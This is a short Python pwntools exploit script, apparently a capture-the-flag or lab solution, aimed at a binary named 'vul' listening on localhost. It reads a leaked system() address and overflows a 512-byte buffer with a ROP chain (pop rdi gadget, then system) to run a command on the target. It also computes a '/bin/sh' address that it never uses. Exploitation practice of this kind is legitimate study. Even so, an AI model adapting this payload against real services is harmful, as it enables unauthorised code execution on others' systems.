# coding: utf-8
#!/usr/bin/env python
from pwn import *
import cle

p = remote('127.0.0.1',41038)#服务器端口号需提取
file = cle.Loader('../vul')
elf = ELF('../vul')

ls_addr = elf.symbols['str']

exec_addr = file.main_bin.sections_map['.text'].vaddr #.text
system_addr = u64(p.recv()) #get system address

POP_RDI = exec_addr + 0xfa # pop rdi ; ret

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
binsh_addr = system_addr + next(libc.search('/bin/sh')) - libc.symbols['system']

payload = 'A'*512 + 'B'*8 + p64(POP_RDI) + p64(ls_addr) + p64(system_addr)

p.writeline(payload)
#p.interactive()
